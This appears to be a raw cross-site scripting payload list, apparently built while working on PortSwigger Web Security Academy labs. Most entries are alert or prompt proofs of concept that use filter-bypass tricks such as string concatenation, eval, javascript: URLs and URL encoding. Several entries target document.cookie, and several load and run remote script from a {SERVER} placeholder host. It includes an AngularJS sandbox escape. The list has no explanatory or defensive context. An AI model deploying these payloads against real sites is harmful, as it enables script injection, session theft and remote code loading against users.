<iframe src="https://0a85000d037e197c815275e200c80061.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
"onmouseout="alert(1)
\"-alert(1)}//
...
<script>window.onerror=alert</script><img src=x onerror=throw new Error>
<script>fetch('data:text/html,<script>alert("XSS")<\/script>')</script>
<script>location='javascript:alert("XSS")'</script>
<script>document.body.innerHTML+='<iframe src="javascript:alert(\'XSS\')"></iframe>'</script>
<script>window.name='<svg onload=alert("XSS")>'</script>
...
<script>let img = new Image(); img.src="javascript:alert('XSS')";</script>
<script>open("javascript:alert('XSS')")</script>
<script>history.pushState({}, "", "javascript:alert('XSS')")</script>
<script>document.body.appendChild(document.createElement('script')).innerText="alert('XSS')"</script>
<script>navigator.sendBeacon('javascript:alert("XSS")')</script>
<script>window.localStorage.setItem('XSS', '<script>alert("XSS")<\/script>');</script>
...
<script>parent.frames['name'].document.body.innerHTML='<script>alert("XSS")<\/script>'</script>
<script>with(document)write('<script>alert("XSS")<\/script>')</script>
<script>location.href='javascript:alert("XSS")'</script>
<script>setTimeout('alert("XSS")', 1000)</script>
<script>window.onerror=function(){alert("XSS")};throw new Error()</script>
<script>var x=new Image(); x.src="javascript:alert('XSS')"</script>
<script>var y=window.open("javascript:alert('XSS')")</script>
<script>var a = document.createElement("script"); a.src="data:text/javascript,alert('XSS')"; document.body.appendChild(a);</script>
<script>console.log('<script>alert("XSS")<\/script>')</script>
<script>document.location = "javascript:alert('XSS')"</script>
<script>window.name = "javascript:alert('XSS')"</script>
<script>document.body.insertAdjacentHTML('beforeend','<iframe src="javascript:alert(\'XSS\')"></iframe>')</script>
<script>let f=document.createElement('iframe'); f.src='javascript:alert("XSS")'; document.body.appendChild(f);</script>
<script>let x=new XMLHttpRequest(); x.open("GET","javascript:alert('XSS')"); x.send()</script>
<script>window.opener && window.opener.alert('XSS')</script>
<script>window.alert.call(window, 'XSS')</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>top["al"+"ert"]('XSS')</script>
<script>self['ale'+'rt']('XSS')</script>
<script>this['aler'+'t']('XSS')</script>
<script>window['ale'+'rt']('XSS')</script>
<script>let s=document.createElement('script'); s.innerHTML='alert("XSS")'; document.body.appendChild(s);</script>
<script>location.assign("javascript:alert('XSS')")</script>
<script>location.replace("javascript:alert('XSS')")</script>
<script>location.reload=alert</script><img src=x onerror="location.reload()">
<script>document.documentElement.innerHTML = '<svg onload=alert("XSS")>'</script>
<script>document.body.insertAdjacentText('beforeend', "<script>alert('XSS')<\/script>")</script>
...
<script>window.onerror=()=>alert('XSS'); throw new Error();</script>
<script>setTimeout("alert('XSS')", 1000)</script>
<script>document.write('<img src=x onerror=alert("XSS")>')</script>
<script>document.body.innerHTML += '<iframe src="javascript:alert(\'XSS\')"></iframe>'</script>
<script>document.querySelector('body').innerHTML = '<svg onload=alert("XSS")>'</script>
<script>addEventListener('load', ()=>alert('XSS'))</script>
<script>history.pushState(null,null,'javascript:alert("XSS")')</script>
<script>eval('ale' + 'rt("XSS")')</script>
<script>setTimeout(()=>eval('alert("XSS")'), 1000)</script>
<script>Function('alert("XSS")')()</script>
<script>let f=Function('alert("XSS")'); f();</script>
<script>let e=document.createElement('script'); e.text='alert("XSS")'; document.body.appendChild(e);</script>
<script>let s=document.createElement('script'); s.src='data:text/javascript,alert("XSS")'; document.body.appendChild(s);</script>
<script>open('data:text/html,<script>alert("XSS")<\/script>')</script>
<script>let xhr=new XMLHttpRequest(); xhr.open("GET","javascript:alert('XSS')"); xhr.send()</script>
<script>navigator.vibrate(100); alert("XSS");</script>
<script>let s="al"+"ert"; window[s]("XSS")</script>
<script>setTimeout(()=>window['alert']("XSS"), 1000)</script>
<script>let a="alert"; window[a]("XSS")</script>
<script>let obj={a:alert}; obj.a("XSS")</script>
<script>document.body.insertAdjacentHTML('beforeend', `<img src=x onerror=alert('XSS')>`)</script>
<script>window.open('data:text/html,<script>alert("XSS")<\/script>')</script>
<script>window['con'+'sole'].log('<script>alert("XSS")<\/script>')</script>
<script>var x=document.createElement("script"); x.text="alert('XSS')"; document.body.appendChild(x);</script>
"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
...
%22%3E%3C%2Fscript%3E%22%3E%3C--%3Cimg%2Bsrc%3D%20%22%3E%3Csvg%2Fonload%3Dalert(document.cookie)%3E%3E%20--%21%3E
%22%3E%3C%2Fscript%3E%22%3E%3C--%3Cimg%2Bsrc%3D%20%22%3E%3Csvg%2Fonload%3Dalert(document.cookie)%3E%3E%20--%21%3E
%60-alert%3F.(1)-%27
%2522autofocus%252fonfocus%253dalert(1)--%253E
%2522autofocus%252fonfocus%253dalert(1)--%253E
%7B%7Bconstructor.constructor(%22import('%7BSERVER%7D')%22)()%7D%7D
%22%22%22%3E%3Cscript%20src%3D%22%7BSERVER%7D%2Fscript.js%22%3E%3C%2Fscript%3E
%22%3E%3Cscript%3E$.getScript(%22%7BSERVER%7D%22)%3C%2Fscript%3E
%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3B%20url%3D%7BSERVER%7D%22%20%2F%3E
%7B%7B'a'.constructor.prototype.charAt%3D%22.valueOf%3B%20%24eval(%22x%3D'%5C%22%2B(y%3D'if(!window%5Cu002ex)alert(window%20%5Cu002ex%3D1)')%2Beval(y)%2B%22%5C%22')%3B%7D%7D
"></script>"><--<img+src= "><svg/onload=alert(document.cookie)>> --!>
"></script>"><--<img+src= "><svg/onload=alert(document.cookie)>> --!>
`-alert?.(1)-'
%22autofocus%2fonfocus%3dalert(1)--%3E
{{constructor.constructor("import('{SERVER}')")()}}
